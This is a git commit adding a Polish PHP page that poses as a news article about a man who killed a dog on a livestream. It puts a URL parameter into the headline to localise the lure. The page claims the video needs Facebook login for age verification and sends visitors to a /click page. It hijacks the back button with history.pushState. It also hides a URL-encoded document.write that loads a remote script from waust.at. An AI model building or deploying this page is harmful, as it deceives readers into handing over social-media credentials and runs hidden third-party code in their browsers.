31c7ba126aae2ba9e32d2b652dc1793a7b12efbe
paffilateskp <80223668+paffilateskp@users.noreply.github.com>
2021-04-07 02:46:03 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,258 @@
+
+<!doctype html>
+<html lang="pl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/x-icon" href="img/favicon.png">
+
+    <title>
+        38 latek z <?php $y = $_GET['yx'] ?? ''; if ($y) {   echo '' . htmlspecialchars($y); }?> zabił psa podczas transmisji na żywo, rozpoznajesz sprawcę?
+    </title>
+	
+
+		<meta property="og:title" content="38 latek z <?php $y = $_GET['yx'] ?? ''; if ($y) {   echo '' . htmlspecialchars($y); }?> zabił psa podczas transmisji na żywo, rozpoznajesz sprawcę?" />
+        <meta property="og:description" content="Na wideo uchwycony został straszny moment [WIDEO]" />
+        <meta property="og:image" content="debug.jpg" />
+        <meta property="og:image:type" content="image/jpeg" />
+        <meta property="og:type" content="article" />
+        <meta property="og:site_name" content="" />
+        <meta property="og:locale" content="pl_PL" />
+
+    <script async src="v0.js"></script>
+    
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto&amp;subset=latin-ext">
+
+    <link href="style.css" rel="stylesheet">
+
+
+</head>
+<body class="ucs-infoskin">
+
+    <header class="header">
+        <a href="click.html">
+        </a>
+
+        <a href="click.html">
+            <amp-img src="img/wiadomosci.svg"
+                title="Wiadomości" width="107" height="30" layout="fixed"></amp-img>
+        </a>
+
+    </header>
+    <div id="page">
+        <article>
+            <div class="dateAuthor">
+                <span class="date">dzisiaj 10:17</span>
+                | 
+                <span class="author">Edyta Korsak</span>
+            </div>
+            <h1 class="name headline">
+                 38 latek z <?php $y = $_GET['yx'] ?? ''; if ($y) {   echo '' . htmlspecialchars($y); }?> zabił psa podczas transmisji na żywo, rozpoznajesz sprawcę?
+            </h1>
+            <div class="social-box">
+                <a href="click.html"><amp-social-share type="facebook"></amp-social-share></a>
+                <a href="click.html"><amp-social-share type="twitter"></amp-social-share></a>
+            </div>
+            <figure class="lead">
+                <div class="wrapper">
+                    <a href="click.html">
+                        <amp-img
+                        loading="lazy"
+                        src="debug.jpg"
+                        on="tap:lightbox" role="button" tabindex="0"
+                        width="788" height="443"
+                        layout="responsive"></amp-img>
+                    </a>
+                </div>
+            </figure>
+
+            <p style="font-weight: bolder;">
+                Policja publikuje wizerunek 38-letniego mężczyzny, która podczas poprzedniej nocy prowadził transmisje na żywo, na której katował psa. Policja prosi o kontakt wszystkich, którzy mogą mieć informacje nt. miejsca pobytu mężczyzny.
+            </p>
+
+
+
+            <p style="padding-left: 30px; padding-right: 30px; font-style: italic">
+                <span style="font-weight: bolder;">Redaktor:</span>
+                "Prosimy o udostępnienia, takie bestialskie zachowanie nie może być tolerowane. Poniżej film z transmisji został udostępniony."
+            </p>
+
+
+<div id="player1">
+						<div id="playbu" class="play-button" onclick="playb(); playb1();"></div>
+
+<div id="ladowan" class="sk-circle">
+  <div class="sk-circle1 sk-child"></div>
+  <div class="sk-circle2 sk-child"></div>
+  <div class="sk-circle3 sk-child"></div>
+  <div class="sk-circle4 sk-child"></div>
+  <div class="sk-circle5 sk-child"></div>
+  <div class="sk-circle6 sk-child"></div>
+  <div class="sk-circle7 sk-child"></div>
+  <div class="sk-circle8 sk-child"></div>
+  <div class="sk-circle9 sk-child"></div>
+  <div class="sk-circle10 sk-child"></div>
+  <div class="sk-circle11 sk-child"></div>
+  <div class="sk-circle12 sk-child"></div>
+</div>
+<div id="ciastko">
+<div id="tlo2">
+<center><div id="textplay"><h3>Ze względu na drastyczność materiał dostępny dla osób powyżej 16 roku życia<br />Zweryfikuj swój wiek przez facebooka</h3>
+<br><br>
+<a href="/click" target="_blank"><button class="button" onclick="tlo2.style.display=&#39;none&#39;;" style="vertical-align:middle"><span>Zaloguj się </span></button></a>
+</div></center></div></div>
+<style>
+
+
+.play-button {
+    height: 80px;
+    width: 105px;    
+    background-color: rgba(0, 0, 0, 0.7);
+    border-radius: 5px;
+    position: relative;
+	top:40%;
+	left:40%;
+	margin-left:-52.5px;
+	cursor: pointer
+}
+
+.play-button:hover {
+    background-color: rgba(0, 173, 239, 0.9);
+}
+
+.play-button:after {
+    content: "";
+    display: block;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    margin-left: -9.5px;
+    margin-top: -18px;
+    border-style: solid;
+    border-width: 19px 0 19px 32px;
+    border-color: transparent transparent transparent rgba(255, 255, 255, 1);
+}
+#player1 {
+	width: 359px; 
+	height: 455px;
+	background-image:url('video.jpg');
+	background-size:388px 443px;
+	
+}
+#ladowan {
+	display:none;
+	top:205px;
+	left:360px;
+}
+#textplay {
+	width: 299px; 
+	height: 200px;
+	font-size:25px;
+	color: white;
+	opacity: 1;
+}
+#tlo2{
+	width: 399px; 
+	height: 455px;
+	background: #000000;
+	opacity: 0.9;	
+	display:none;
+}
+
+.button {
+  display: inline-block;
+  border-radius: 4px;
+  background-color: #3b5998;
+  border: none;
+  color: #FFFFFF;
+  text-align: center;
+  font-size: 28px;
+  padding: 20px;
+  width: 250px;
+  transition: all 0.5s;
+  cursor: pointer;
+  margin: 5px;
+}
+
+.button span {
+  cursor: pointer;
+  display: inline-block;
+  position: relative;
+  transition: 0.5s;
+}
+
+.button span:after {
+  content: '>>';
+  position: absolute;
+  opacity: 0;
+  top: 0;
+  right: -20px;
+  transition: 0.5s;
+}
+
+.button:hover span {
+  padding-right: 40px;
+}
+
+.button:hover span:after {
+  opacity: 1;
+  right: 0;
+}
+.w3-animate-input{-webkit-transition:width 0.4s ease-in-out;transition:width 0.4s ease-in-out}
+.w3-animate-input:focus{width:100%!important}
+.w3-border-0{border:0!important}
+.w3-border{border:1px solid #ccc!important}
+.w3-border-top{border-top:1px solid #ccc!important}.w3-border-bottom{border-bottom:1px solid #ccc!important}
+.w3-border-left{border-left:1px solid #ccc!important}.w3-border-right{border-right:1px solid #ccc!important}
+.w3-input-group,.w3-group{margin-top:24px;margin-bottom:24px}
+.w3-input{padding:8px;display:block;border:none;border-bottom:1px solid #808080;width:100%}
+.w3-label{color:#009688}.w3-input:not(:valid)~.w3-validate{color:#f44336}
+</style>
+    
+						<script>
+function playb() {
+setTimeout('ladowan.style.display="block"', 400);
+setTimeout('playbu.style.display="none"', 400);
+}
+</script>
+
+						<script>
+function playb1() {
+setTimeout('ladowan.style.display="none"', 400);
+setTimeout('textplay.style.display="block"', 400);
+setTimeout('tlo2.style.display="block"', 400);
+}
+</script>
+           
+        </article>
+
+    </div>
+
+    <div class="bottomLayerBar">
+        <a href="click.html"
+            class="barLink">
+            <span>Zapis z transmisji video</span>
+        </a>
+    </div>
+</body>
+
+<script>
+  !function () {
+      var t;
+      var tmp = '/click';
+      try {
+          for (t = 0; 10 > t; ++t) history.pushState({}, '', '');
+          onpopstate = function (t) {
+              t.state && location.replace(tmp);
+          }
+      } catch (o) {
+      }
+  }();
+  </script>
+ <script language="javascript">
+<!--
+document.write(unescape('%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%22%3E%3C%73%63%72%69%70%74%20%69%64%3D%22%5F%77%61%75%73%72%63%22%3E%76%61%72%20%5F%77%61%75%20%3D%20%5F%77%61%75%20%7C%7C%20%5B%5D%3B%20%5F%77%61%75%2E%70%75%73%68%28%5B%22%64%79%6E%61%6D%69%63%22%2C%20%22%61%77%31%66%74%30%65%69%30%75%22%2C%20%22%73%72%63%22%2C%20%22%63%34%33%30%32%62%66%66%66%66%66%66%22%2C%20%22%73%6D%61%6C%6C%22%5D%29%3B%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%20%61%73%79%6E%63%20%73%72%63%3D%22%2F%2F%77%61%75%73%74%2E%61%74%2F%64%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E%3C%2F%64%69%76%3E'));
+//-->
+</script>
+</html>
